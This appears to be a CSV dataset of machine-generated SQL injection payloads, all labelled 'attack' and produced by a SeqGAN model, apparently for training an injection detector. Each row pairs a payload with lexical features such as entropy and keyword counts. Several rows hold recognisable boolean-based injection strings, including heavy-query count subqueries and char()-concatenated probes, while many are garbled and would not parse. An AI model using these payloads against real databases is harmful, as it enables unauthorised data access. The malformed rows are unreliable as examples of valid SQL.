label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"-80041989%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,176,219.0,33.0,3.6274217683827064,111.0,19.0,65.0,24.0,0.5068493150684932,0.0867579908675799,0.2968036529680365,0.1095890410958904,4.0,0.0,1.0,0.0,1.0,2.0,0.0,8.0,2.0,0.0,6.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""0 or 3455  =  =/*",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,177,156.0,32.0,4.038962543960483,77.0,13.0,47.0,19.0,0.4935897435897436,0.08333333333333333,0.30128205128205127,0.12179487179487179,0.0,2.0,0.0,1.0,2.0,3.0,0.0,6.0,0.0,0.0,2.0,6.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,-chlnmjwa'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,178,16.0,12.0,3.375,8.0,0.0,4.0,4.0,0.5,0.0,0.25,0.25,2.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1""  )   or   =  =    4018 7417  8459  =if",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,179,41.0,15.0,2.9435206567664123,4.0,13.0,19.0,5.0,0.0975609756097561,0.3170731707317073,0.4634146341463415,0.12195121951219512,0.0,1.0,0.0,0.0,0.0,3.0,0.0,1.0,0.0,0.0,0.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,-1772r'where char    =  =    (  =--%'  )   or   (  2301  =  7504  )  *7504 and   (  '%,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,180,86.0,24.0,3.475458655435528,15.0,16.0,37.0,18.0,0.1744186046511628,0.18604651162790697,0.43023255813953487,0.20930232558139536,3.0,0.0,3.0,0.0,1.0,4.0,0.0,5.0,2.0,0.0,0.0,8.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,4.0
attack,"1%""     v2642 7417=(    convert  =  =  =  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,181,42.0,17.0,3.1766352793034835,8.0,9.0,18.0,7.0,0.19047619047619047,0.21428571428571427,0.42857142857142855,0.16666666666666666,0.0,1.0,0.0,0.0,0.0,4.0,0.0,1.0,1.0,0.0,0.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"-80048673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""zm'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,182,75.0,29.0,3.8871455194789903,14.0,20.0,28.0,13.0,0.18666666666666668,0.26666666666666666,0.37333333333333335,0.17333333333333334,2.0,2.0,1.0,0.0,0.0,2.0,0.0,4.0,0.0,1.0,1.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,-9133cc wherez  7555   q    =    )   )   117,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,183,44.0,16.0,3.051514870862884,9.0,11.0,20.0,4.0,0.20454545454545456,0.25,0.45454545454545453,0.09090909090909091,0.0,0.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"--2583""t     (  =  =  'unusual'%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,184,39.0,17.0,3.282501348645461,8.0,4.0,15.0,12.0,0.20512820512820512,0.10256410256410256,0.38461538461538464,0.3076923076923077,4.0,1.0,2.0,0.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,5.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ca *=  5485r  =*t 2027  =    ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,185,162.0,33.0,4.220247337047025,78.0,17.0,47.0,20.0,0.48148148148148145,0.10493827160493827,0.29012345679012347,0.12345679012345678,2.0,0.0,0.0,0.0,3.0,4.0,0.0,4.0,0.0,0.0,3.0,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,1760au$wewhere,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,186,14.0,11.0,3.3248629576173565,9.0,4.0,0.0,1.0,0.6428571428571429,0.2857142857142857,0.0,0.07142857142857142,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1'||  (  select 'selectycdcrcou_where _9575  =  8459,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,187,52.0,24.0,4.140947719491076,25.0,9.0,10.0,8.0,0.4807692307692308,0.17307692307692307,0.19230769230769232,0.15384615384615385,2.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,2.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'as or where%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,188,78.0,28.0,3.8433478496501956,27.0,13.0,28.0,10.0,0.34615384615384615,0.16666666666666666,0.358974358974359,0.1282051282051282,4.0,0.0,0.0,0.0,0.0,3.0,0.0,2.0,1.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1"" where 3455o i   3038or njqdw and",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,189,35.0,19.0,3.9077148025974386,17.0,9.0,8.0,1.0,0.4857142857142857,0.2571428571428571,0.22857142857142856,0.02857142857142857,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,-19891760nun   t o where '||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'  =   =  ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,190,112.0,32.0,4.176257258770988,50.0,18.0,32.0,12.0,0.44642857142857145,0.16071428571428573,0.2857142857142857,0.10714285714285714,2.0,0.0,1.0,0.0,0.0,2.0,0.0,2.0,0.0,0.0,0.0,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,-1048%%j%.abcnd,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,191,15.0,13.0,3.589898095464288,6.0,4.0,0.0,5.0,0.4,0.26666666666666666,0.0,0.3333333333333333,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"-1989%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%""  =  ""xbqny'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,192,219.0,37.0,3.84528682690551,61.0,30.0,88.0,40.0,0.2785388127853881,0.136986301369863,0.4018264840182648,0.182648401826484,4.0,2.0,1.0,0.0,0.0,3.0,0.0,18.0,2.0,1.0,3.0,10.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,7.0
attack,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  ''  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,193,202.0,33.0,3.668281697826447,56.0,27.0,84.0,35.0,0.27722772277227725,0.13366336633663367,0.4158415841584158,0.17326732673267325,4.0,0.0,0.0,0.0,0.0,2.0,0.0,18.0,1.0,1.0,3.0,8.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,7.0
attack,"-4873%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""s'   )    )    )    as 3580  2774 ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,194,178.0,35.0,3.9366908320992393,78.0,19.0,60.0,21.0,0.43820224719101125,0.10674157303370786,0.33707865168539325,0.11797752808988764,1.0,2.0,1.0,0.0,1.0,1.0,0.0,9.0,1.0,0.0,2.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1"" or%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,195,13.0,7.0,2.4416298737872246,2.0,1.0,5.0,5.0,0.15384615384615385,0.07692307692307693,0.38461538461538464,0.38461538461538464,0.0,3.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1""   )   )     )     %     '  =  'as",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,196,36.0,9.0,1.7573891057053237,2.0,1.0,25.0,8.0,0.05555555555555555,0.027777777777777776,0.6944444444444444,0.2222222222222222,2.0,1.0,0.0,0.0,0.0,1.0,0.0,3.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"-4462%'  =  '""  =  "" 6388  =    (  3455h(  =  4018    ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,197,54.0,16.0,2.998382090190661,1.0,16.0,25.0,12.0,0.018518518518518517,0.2962962962962963,0.46296296296296297,0.2222222222222222,2.0,2.0,1.0,0.0,0.0,4.0,0.0,2.0,1.0,0.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1or where char=or 7417  =""  =  ""select r2027 char  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,198,51.0,18.0,3.6991892370927695,24.0,9.0,13.0,5.0,0.47058823529411764,0.17647058823529413,0.2549019607843137,0.09803921568627451,0.0,2.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,5.0
attack,1'  %'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,199,12.0,5.0,1.896240625180289,0.0,1.0,6.0,5.0,0.0,0.08333333333333333,0.5,0.4166666666666667,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,-'  )   as juxt where 5956  =  5956 and 8148  =  like  (  '9462'   )   and  selectr,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,200,83.0,29.0,3.895088728318657,28.0,16.0,30.0,9.0,0.3373493975903614,0.1927710843373494,0.3614457831325301,0.10843373493975904,3.0,0.0,1.0,0.0,0.0,2.0,0.0,3.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,d8327h  =    4165 char  select 8327fg=  7555  select,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,201,52.0,21.0,3.877117719811604,20.0,16.0,14.0,2.0,0.38461538461538464,0.3076923076923077,0.2692307692307692,0.038461538461538464,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.0
attack,1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'd,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,202,76.0,15.0,2.5310899644102762,7.0,13.0,44.0,12.0,0.09210526315789473,0.17105263157894737,0.5789473684210527,0.15789473684210525,2.0,0.0,0.0,0.0,1.0,1.0,0.0,8.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,-c'  )   and    (    (   ' where o  7522 dgper char  (  ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,203,56.0,19.0,3.1559960795904827,19.0,4.0,26.0,7.0,0.3392857142857143,0.07142857142857142,0.4642857142857143,0.125,2.0,0.0,1.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.0
attack,"1""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""     ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,204,367.0,29.0,3.214203698215932,95.0,47.0,174.0,51.0,0.25885558583106266,0.12806539509536785,0.47411444141689374,0.13896457765667575,0.0,2.0,0.0,0.0,0.0,2.0,0.0,36.0,0.0,0.0,1.0,12.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,17.0
attack,"-8673"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""   )     or or or char  =  ||  =  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,205,372.0,30.0,3.2294838028392436,90.0,50.0,179.0,53.0,0.24193548387096775,0.13440860215053763,0.48118279569892475,0.1424731182795699,0.0,2.0,1.0,0.0,0.0,3.0,0.0,35.0,0.0,0.0,0.0,16.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0,0.0,0.0,0.0,19.0
attack,1   )   n/* or 6671  =  (  121  2027--g,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,206,39.0,16.0,3.1634820264990826,4.0,12.0,16.0,7.0,0.10256410256410256,0.3076923076923077,0.41025641025641024,0.1794871794871795,0.0,0.0,2.0,1.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,5.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1%'abzg',u3580g=""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,207,23.0,16.0,3.8279097821439696,6.0,5.0,4.0,8.0,0.2608695652173913,0.21739130434782608,0.17391304347826086,0.34782608695652173,2.0,2.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,208,220.0,37.0,3.8517330405531576,67.0,32.0,87.0,34.0,0.30454545454545456,0.14545454545454545,0.39545454545454545,0.15454545454545454,2.0,0.0,0.0,0.0,0.0,2.0,0.0,18.0,0.0,1.0,3.0,10.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,8.0
